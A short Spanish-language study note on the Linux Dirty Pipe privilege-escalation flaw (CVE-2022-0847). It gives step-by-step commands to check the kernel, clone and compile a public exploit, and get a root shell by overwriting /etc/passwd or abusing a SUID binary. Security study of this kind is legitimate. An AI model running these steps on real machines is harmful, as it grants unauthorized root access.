# CVE-2022-0847 – Dirty Pipe

## 🐧 Descripción
Vulnerabilidad en los kernels de Linux desde la versión **5.8 hasta la 5.17** (inclusive).

Permite a un usuario con **permiso de lectura** en un archivo, **escribir en él**, lo que puede llevar a **escalada de privilegios**.

---

## ⚙️ Detalles técnicos
- Se basa en el uso de **pipes** (comunicación unidireccional entre procesos).
- Ejemplo de uso: modificar `/etc/passwd` para eliminar la contraseña del usuario `root`, permitiendo iniciar sesión como root sin necesidad de contraseña.

---

## 🧪 Explotación

### 🔍 Verificar versión del kernel
```bash
uname -r
```

Si está entre `5.8` y `5.17`, el sistema es vulnerable.

### 📥 Descargar y compilar PoC

`git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git cd CVE-2022-0847-DirtyPipe-Exploits bash compile.sh`

### 🚨 Exploit 1 – Modificar `/etc/passwd`
`./exploit-1`
- Establece la contraseña del root como `piped`.
    
- Lanza una shell como root.

### 🔧 Exploit 2 – Ejecutar binarios SUID como root

1. Buscar binarios SUID:
	`find / -perm -4000 2>/dev/null`

2. Ejecutar exploit con uno de ellos (ej. `/usr/bin/sudo`):
	`./exploit-2 /usr/bin/sudo`

	Resultado: se obtiene una shell como root.
